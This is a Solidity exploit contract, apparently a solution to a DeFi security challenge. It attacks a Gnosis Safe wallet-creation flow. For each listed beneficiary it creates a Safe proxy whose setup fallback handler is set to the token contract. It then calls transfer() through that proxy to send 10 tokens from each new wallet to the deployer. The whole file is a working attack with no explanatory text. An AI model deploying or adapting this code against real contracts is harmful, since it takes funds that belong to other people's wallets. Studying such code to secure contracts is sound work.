// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";

contract OneCallbackdoor {
    constructor(
        address[] memory addresses,
        address safeFactory,
        address masterCopy,
        address token,
        address proxycallback
    ) {
        hack(
            addresses,
            safeFactory,
            masterCopy,
            token,
            proxycallback,
            msg.sender
        );
    }

    // we use the token address as "fallback" in gnosisSafe::setup param
    function hack(
        address[] memory addresses,
        address safeFactory,
        address masterCopy,
        address token,
        address proxycallback,
        address _attacker
    ) internal {
        address[] memory ownerz = new address[](1);

        for (uint i = 0; i < addresses.length; i++) {
            ownerz[0] = addresses[i];
            bytes memory initalizer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                ownerz,
                1,
                address(0),
                bytes(""),
                token, // <- fallback
                token,
                0,
                address(0)
            );
            GnosisSafeProxy prox = GnosisSafeProxyFactory(safeFactory)
                .createProxyWithCallback(
                    masterCopy,
                    initalizer,
                    1,
                    IProxyCreationCallback(proxycallback)
                );
            address(prox).call{gas: gasleft()}(
                abi.encodeWithSignature(
                    "transfer(address,uint256)",
                    _attacker,
                    10 ether
                )
            );
        }
    }
}
